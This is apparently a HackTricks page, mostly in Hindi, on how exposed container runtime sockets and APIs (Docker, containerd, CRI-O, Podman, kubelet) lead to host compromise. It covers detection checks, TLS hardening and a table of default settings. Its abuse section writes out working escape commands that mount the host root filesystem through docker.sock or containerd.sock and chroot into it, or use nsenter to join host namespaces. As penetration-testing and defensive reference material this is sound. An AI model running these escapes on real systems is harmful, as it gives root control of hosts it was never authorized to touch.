# Runtime API और Daemon एक्सपोजर

{{#include ../../../banners/hacktricks-training.md}}

## अवलोकन

कई वास्तविक container compromises बिल्कुल भी namespace escape से शुरू नहीं होते। वे runtime control plane तक पहुंच से शुरू होते हैं। यदि कोई workload एक mounted Unix socket या exposed TCP listener के जरिए `dockerd`, `containerd`, CRI-O, Podman, या kubelet से बात कर सकता है, तो attacker बेहतर privileges वाले नए container का अनुरोध कर सकता है, host filesystem को mount कर सकता है, host namespaces में शामिल हो सकता है, या संवेदनशील node जानकारी प्राप्त कर सकता है। ऐसे मामलों में, runtime API असली सुरक्षा सीमा होती है, और इसे compromise करना व्यवहारिक रूप से host compromise के करीब होता है।

इसीलिए runtime socket exposure को kernel protections से अलग दस्तावेज़ करना चाहिए। एक container जिसमें सामान्य seccomp, capabilities, और MAC confinement हैं, फिर भी host compromise से सिर्फ एक API कॉल दूर हो सकता है अगर `/var/run/docker.sock` या `/run/containerd/containerd.sock` उसके अंदर mount किया गया हो। वर्तमान container का kernel isolation बिल्कुल वैसे ही काम कर रहा हो सकता है जैसा डिज़ाइन किया गया है, जबकि runtime management plane पूरी तरह से exposed बना रह सकता है।

## Daemon पहुँच मॉडल

Docker Engine पारंपरिक रूप से अपना privileged API लोकल Unix socket `unix:///var/run/docker.sock` के जरिए एक्सपोज़ करता है। ऐतिहासिक रूप से इसे दूरस्थ रूप से TCP listeners जैसे `tcp://0.0.0.0:2375` या `2376` पर TLS-protected listener के जरिए भी एक्सपोज़ किया गया है। मजबूत TLS और client authentication के बिना daemon को रिमोटली एक्सपोज़ करना व्यावहारिक रूप से Docker API को एक remote root interface में बदल देता है।

containerd, CRI-O, Podman, और kubelet समान उच्च-प्रभाव वाले surfaces एक्सपोज़ करते हैं। नाम और workflows अलग हो सकते हैं, लेकिन logic अलग नहीं होता। अगर interface caller को workloads बनाना, host paths mount करना, credentials प्राप्त करना, या running containers को बदलने की अनुमति देता है, तो वह interface एक privileged management channel है और उसी अनुरूप व्यवहार किया जाना चाहिए।

जाँच के लायक सामान्य स्थानीय पथ हैं:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
पुराने या अधिक विशेषीकृत स्टैक्स ऐसे endpoints भी एक्सपोज़ कर सकते हैं जैसे `dockershim.sock`, `frakti.sock`, या `rktlet.sock`। ये आधुनिक वातावरणों में कम आम हैं, लेकिन जब मिलें तो इन्हें उसी सावधानी के साथ माना जाना चाहिए क्योंकि ये सामान्य application sockets के बजाय runtime-control surfaces का प्रतिनिधित्व करते हैं।

## Secure Remote Access

यदि किसी daemon को local socket से परे एक्सपोज़ करना अनिवार्य है, तो कनेक्शन को TLS से सुरक्षित किया जाना चाहिए और वरीयता के अनुसार mutual authentication होनी चाहिए ताकि daemon क्लाइंट को और क्लाइंट daemon को सत्यापित करे। सुविधा के लिए Docker daemon को plain HTTP पर खोलने की पुरानी आदत container administration में सबसे खतरनाक गलतियों में से एक है क्योंकि API surface इतना शक्तिशाली है कि वह सीधे privileged containers बना सकता है।

The historical Docker configuration pattern looked like:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
On systemd-based hosts, daemon communication may also appear as `fd://`, meaning the process inherits a pre-opened socket from systemd rather than binding it directly itself. महत्वपूर्ण सबक सटीक syntax नहीं बल्कि सुरक्षा परिणाम है। जैसे ही daemon tightly permissioned local socket से बाहर सुनना शुरू करता है, transport security और client authentication optional hardening नहीं रहकर अनिवार्य हो जाते हैं।

## दुरुपयोग

यदि कोई runtime socket मौजूद है, तो पुष्टि करें कि वह कौन सा है, क्या कोई compatible client मौजूद है, और क्या raw HTTP या gRPC access संभव है:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```
ये commands उपयोगी हैं क्योंकि ये dead path, mounted लेकिन inaccessible socket, और live privileged API के बीच अंतर करती हैं। अगर client सफल हो जाता है, तो अगला सवाल यह है कि क्या API एक नया container लॉन्च कर सकता है जिसमें host bind mount या host namespace sharing हो।

### Full Example: Docker Socket To Host Root

यदि `docker.sock` पहुँच योग्य है, तो पारंपरिक escape यह है कि एक नया container शुरू किया जाए जो host root filesystem को mount करे और फिर `chroot` करके उसमें प्रवेश किया जाए:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
यह Docker daemon के माध्यम से सीधे host-root execution प्रदान करता है। प्रभाव केवल फ़ाइल पढ़ने तक सीमित नहीं है। नए container के अंदर पहुँचने के बाद, attacker होस्ट फाइलों में बदलाव कर सकता है, credentials एकत्र कर सकता है, persistence स्थापित कर सकता है, या अतिरिक्त privileged workloads शुरू कर सकता है।

### Full Example: Docker Socket To Host Namespaces

यदि attacker filesystem-only access की बजाय namespace entry पसंद करता है:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
यह रास्ता होस्ट तक पहुँचता है runtime से नया container बनाने के लिए कहकर जिसमें explicit host-namespace exposure हो, बजाय इसके कि मौजूदा container को exploit किया जाए।

### पूर्ण उदाहरण: containerd Socket

माउंट किया गया `containerd` socket आमतौर पर उतना ही खतरनाक होता है:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
प्रभाव फिर से host compromise है। भले ही Docker-specific tooling अनुपस्थित हो, कोई अन्य runtime API अभी भी समान प्रशासनिक अधिकार प्रदान कर सकता है।

## Checks

इन checks का उद्देश्य यह जानना है कि क्या container किसी ऐसे management plane तक पहुँच सकता है जो trust boundary के बाहर रहना चाहिए था।
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```
What is interesting here:

- A mounted runtime socket is usually a direct administrative primitive rather than mere information disclosure.
- A TCP listener on `2375` without TLS should be treated as a remote-compromise condition.
- Environment variables such as `DOCKER_HOST` often reveal that the workload was intentionally designed to talk to the host runtime.

## रनटाइम डिफ़ॉल्ट

| Runtime / platform | डिफ़ॉल्ट स्थिति | डिफ़ॉल्ट व्यवहार | आम मैन्युअल कमजोरियाँ |
| --- | --- | --- | --- |
| Docker Engine | डिफ़ॉल्ट रूप से लोकल Unix socket | `dockerd` लोकल socket पर सुनता है और daemon आम तौर पर root अधिकारों वाला होता है | माउंट करना `/var/run/docker.sock`, एक्सपोज़ करना `tcp://...:2375`, `2376` पर कमजोर या गायब TLS |
| Podman | डिफ़ॉल्ट रूप से daemonless CLI | सामान्य लोकल उपयोग के लिए कोई लंबी-जीवित privileged daemon आवश्यक नहीं है; जब `podman system service` enabled हो तो API sockets फिर भी एक्सपोज़ हो सकते हैं | एक्सपोज़ करना `podman.sock`, सर्विस को व्यापक रूप से चलाना, rootful API उपयोग |
| containerd | लोकल privileged socket | लोकल socket के माध्यम से Administrative API एक्सपोज़ होता है और आमतौर पर higher-level tooling द्वारा उपयोग किया जाता है | माउंट करना `containerd.sock`, व्यापक `ctr` या `nerdctl` एक्सेस, privileged namespaces को एक्सपोज़ करना |
| CRI-O | लोकल privileged socket | CRI endpoint नोड-लोकल विश्वसनीय घटकों के लिए इरादे किया गया है | माउंट करना `crio.sock`, CRI endpoint को untrusted workloads के लिए एक्सपोज़ करना |
| Kubernetes kubelet | Node-local management API | Kubelet Pods से व्यापक रूप से पहुंच योग्य नहीं होना चाहिए; पहुँच authn/authz पर निर्भर करते हुए pod state, credentials, और execution फीचर्स को एक्सपोज़ कर सकती है | माउंट करना kubelet sockets या certs, कमजोर kubelet auth, host networking के साथ पहुंच योग्य kubelet endpoint |
{{#include ../../../banners/hacktricks-training.md}}
